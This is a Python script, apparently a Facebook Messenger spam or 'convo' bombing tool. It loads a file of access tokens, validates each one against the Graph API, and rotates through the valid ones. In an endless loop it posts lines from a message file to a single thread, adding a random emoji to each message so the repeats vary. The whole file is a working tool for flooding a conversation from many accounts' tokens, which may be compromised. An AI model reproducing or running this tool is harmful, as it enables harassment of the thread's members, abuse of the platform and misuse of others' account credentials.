import os
import sys
import time
import json
import requests
import random
from datetime import datetime

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

CONFIG_FILE = "config.json"
INVALID_TOKENS = {}

BANNER = f"""{RED}
   _____ _____ _____ _____ 
  / ____|_   _|  __ \_   _|
 | (___   | | | |  | || |  
  \___ \  | | | |  | || |  
  ____) |_| |_| |__| || |_ 
 |_____/|_____|_____/_____|
       --- S A I I M ---
{RESET}
"""

def print_banner():
    os.system("clear")
    print(BANNER)

def load_config():
    if not os.path.isfile(CONFIG_FILE):
        print(f"{RED}[x] config.json not found! Run convo.py first to generate it.{RESET}")
        sys.exit()
    with open(CONFIG_FILE, "r") as f:
        return json.load(f)

def get_profile_name(token):
    url = "https://graph.facebook.com/v15.0/me"
    try:
        r = requests.get(url, params={"access_token": token}, timeout=10)
        data = r.json()
        return data.get("name", "Unknown") if "error" not in data else None
    except:
        return None

def send_message(thread_id, message, token):
    url = f"https://graph.facebook.com/v15.0/t_{thread_id}"
    payload = {"access_token": token, "message": message}
    try:
        r = requests.post(url, data=payload, timeout=10)
        if r.ok:
            return True, None
        else:
            err = r.json().get("error", {}).get("message", "Unknown error")
            return False, err
    except Exception as e:
        return False, str(e)

def load_lines(path):
    if not os.path.exists(path):
        print(f"{RED}[x] File not found: {path}{RESET}")
        sys.exit()
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def filter_valid_tokens(tokens):
    valid = []
    for token in tokens:
        if token in INVALID_TOKENS:
            if time.time() - INVALID_TOKENS[token] < 300:  # wait 5 mins before retry
                continue
            else:
                del INVALID_TOKENS[token]
        name = get_profile_name(token)
        if name:
            valid.append(token)
        else:
            INVALID_TOKENS[token] = time.time()
            print(f"{RED}[!] Skipping invalid token.{RESET}")
    return valid

def main():
    print_banner()
    config = load_config()

    token_file = config["token_file"]
    thread_id = config["thread_id"]
    prefix = config.get("prefix", "")
    message_file = config["message_file"]
    delay = int(config["delay"])

    messages = load_lines(message_file)
    emojis = [" 3:)", " :)", " :3", " ^_^", " :D", " ;)", " :P", " ❤", " ☹"]

    msg_index = 0
    token_index = 0

    print(f"{YELLOW}--- Live Logs (press Ctrl+C to stop) ---{RESET}")

    try:
        while True:
            tokens = load_lines(token_file)
            valid_tokens = filter_valid_tokens(tokens)

            if not valid_tokens:
                print(f"{RED}[!] No valid tokens right now. Retrying in 60 seconds...{RESET}")
                time.sleep(60)
                continue

            token = valid_tokens[token_index % len(valid_tokens)]
            msg = f"{prefix} {messages[msg_index % len(messages)]} {random.choice(emojis)}"

            success, err = send_message(thread_id, msg, token)
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            if success:
                name = get_profile_name(token)
                print(f"{GREEN}[{now}] Message sent from '{name or 'Unknown'}': {msg}{RESET}")
                msg_index += 1
            else:
                print(f"{RED}[{now}] Failed (Token {token_index+1}): {err}{RESET}")
                INVALID_TOKENS[token] = time.time()

            token_index += 1
            time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Stopped by user.{RESET}")
        sys.exit()
    except Exception as e:
        print(f"{RED}[FATAL ERROR] {e}{RESET}")
        time.sleep(5)

if __name__ == "__main__":
    main()
